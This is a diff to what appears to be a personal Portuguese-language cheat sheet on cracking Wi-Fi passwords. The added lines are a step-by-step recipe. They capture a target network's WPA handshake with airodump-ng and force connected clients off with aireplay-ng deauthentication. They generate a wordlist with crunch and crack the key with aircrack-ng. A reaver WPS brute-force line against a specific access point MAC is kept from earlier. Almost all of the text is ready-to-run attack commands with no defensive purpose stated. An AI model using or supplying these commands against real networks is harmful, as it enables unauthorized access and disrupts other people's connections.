@@ -44,6 +44,61 @@ virus
 
 reaver -i wlan0mon -b B0:4E:26:EF:33:0E -c 10 -vv -f -K 1
 
+########### como pegar wpa (1 ou 2) ###############################
+https://nsworld.com.br/cracking-wpa-com-aircrack-ng/
 
+
+https://www.youtube.com/watch?v=DvaQ7xSlmOk
+
+help
+reaver -h
+
+comnando novo
+reaver -i [placarede] -b [macalvo] -d 30 -S -N -vv
+
+########## PEGAR O HANSHAKE de autenticação #####################################
+referencia
+https://nsworld.com.br/cracking-wpa-com-aircrack-ng/
+https://www.youtube.com/watch?v=szRZWQk7oGY
+https://www.youtube.com/watch?v=WfYxrLaqlN8
+[sem wordlist com crunch]
+https://www.youtube.com/watch?v=v15lZlwXszE
+https://www.youtube.com/watch?v=kjNIdJ2noDs
+
+tl-wn772n versao1
+
+
+############## PASSO 1 - listar redes ##################################
+wash -i wlan0mon
+ou
+airdump-ng wlan0mon
+
+############## PASSO 2 - listar clientes conectados ################################
+airodump-ng -c 9 --bssid 00: 14: 6C: 7E: 40: 80 -w arquivolog wlan0mon
+
+-c 9 é o canal para a rede sem fio
+– -bssid 00: 14: 6C: 7E: 40: 80 é o endereço MAC do ponto de acesso. Isso elimina o tráfego estranho.
+-w psk é o prefixo do nome do arquivo para o arquivo que conterá os IVs.
+ath0 é o nome da interface.
+
+############## PASSO 3 - OPCIONAL ... SOLICITA AO CLIENTE CONECTADO RECONECTAR ##########
+aireplay-ng -0 1 -a 00: 14: 6C: 7E: 40: 80 -c 00: 0F: B5: FD: FB: C2 ath0
+ou
+aireplay-ng --deauth 0 -a [macroteador] wlan0mon
+
+-0 significa desautorização
+1 é o número de deauths a enviar (você pode enviar vários se desejar)
+-a 00: 14: 6C: 7E: 40: 80 é o endereço MAC do ponto de acesso
+-c 00: 0F: B5: FD: FB: C2 é o endereço MAC do cliente que você está consultando
+ath0 é o nome da interface
+
+################## Passo 4 - Criar wordlist ########################
+crunch [min] [max] [caracteres] >> [arquivo]
+crunch 8 8 123456789 >> senha.txt
+crunch 8 8 -t 99%%%%99 123456789 
+
+
+############# PASSO 4 - quebrar senha com wordlist #########################
+aircrack-ng arquivolog.cap -w wordlist.txt
 
 
